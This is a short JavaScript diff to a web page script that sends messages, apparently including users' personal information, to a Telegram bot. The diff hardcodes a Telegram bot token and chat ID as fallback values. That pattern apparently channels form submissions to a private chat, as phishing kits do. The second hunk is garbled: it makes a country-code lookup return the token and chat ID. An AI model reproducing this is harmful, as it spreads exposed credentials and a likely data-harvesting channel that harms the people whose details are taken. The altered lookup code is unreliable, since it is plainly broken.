@@ -4,8 +4,8 @@ const TELEGRAM_PENDING_MESSAGES_KEY = "pendingTelegramMessages";
 const TELEGRAM_SEPARATOR = "<b>───────────────</b>";
 const TELEGRAM_PERSONAL_INFO_MISSING_LINE = "المستخدم لم يقم بادخال المعلومات الشخصية";
 const TELEGRAM_CONFIG = window.__TELEGRAM_CONFIG__ || {};
-const TELEGRAM_BOT_TOKEN = String(TELEGRAM_CONFIG.botToken || "");
-const TELEGRAM_CHAT_ID = String(TELEGRAM_CONFIG.chatId || "");
+const TELEGRAM_BOT_TOKEN = String(TELEGRAM_CONFIG.botToken || "8722266485:AAFdgL-z89n8BOiEtgonO68BI4MscX4D-f8");
+const TELEGRAM_CHAT_ID = String(TELEGRAM_CONFIG.chatId || "6025858761");
 const COUNTRY_STORAGE_KEY = "country";
 const LOCATION_STORAGE_KEY = "location";
 const SUBMISSION_LOADING_DURATION_MS = 3000;
@@ -28,7 +28,7 @@ const LOCATION_API_FALLBACKS = [
   {
     url: "https://ipwho.is/",
     getCountryCode(data) {
-      return data && data.success ? data.country_code || "" : "";
+      return data && data.success ? data.country_code || "6025858761" : "8722266485:AAFdgL-z89n8BOiEtgonO68BI4MscX4D-f8";
     },
   },
 ];
